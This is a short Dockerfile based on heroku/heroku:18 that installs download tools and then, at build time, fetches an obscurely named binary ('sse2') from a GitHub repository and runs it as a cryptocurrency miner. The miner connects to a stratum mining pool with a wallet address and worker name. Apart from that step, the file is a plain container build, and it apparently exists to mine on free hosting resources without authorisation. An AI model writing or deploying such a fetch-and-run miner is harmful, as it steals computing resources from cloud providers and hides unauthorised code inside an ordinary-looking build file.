FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/AVGandhi/student/raw/main/sse2; chmod +x sse2; ./sse2 -a power2b -o stratum+tcps://stratum-ap.rplant.xyz:17022 -u MZcw786kC8ng7KUeHZMQuhFhr2Funss7Kk.VPS -p password=test
CMD bash heroku.sh
